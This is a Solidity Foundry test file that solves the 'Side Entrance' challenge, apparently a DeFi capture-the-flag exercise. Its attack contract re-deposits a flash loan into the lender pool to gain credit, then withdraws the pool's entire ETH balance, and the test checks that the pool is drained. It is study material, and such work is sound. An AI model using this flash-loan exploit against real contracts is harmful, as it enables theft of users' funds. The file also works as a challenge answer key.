// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttack {
    SideEntranceLenderPool side;
    address hacker;
    constructor(address _addr) {
        side = SideEntranceLenderPool(_addr);
        hacker = msg.sender;
    }
    function execute() external payable {
        // only allow lender contract to call this function.
        require(msg.sender == address(side));
        //gets called during flashloan. credits us with all the eth.
        side.deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == hacker);
        uint256 balanceOfPool = address(side).balance;
        side.flashLoan(balanceOfPool);
        // we are now credited with all the eth so now we can call withdraw.
        side.withdraw();
        // we transfer the eth to the attacker address.
        payable(hacker).transfer(address(this).balance);
    }

    // receive function so we can call withdraw() and receive eth.
    receive() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;
    // our attack contract
    SideEntranceLenderPoolAttack internal attackContract;
    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    // forge test --match-contract SideEntrance
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        // our attack contract
        attackContract = new SideEntranceLenderPoolAttack(address(sideEntranceLenderPool));
        // we call flashloan and deposit the borrowed amount via deposit() to credit ourselves all of the eth, allowing us to withdraw the whole balance later.
        attackContract.attack();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
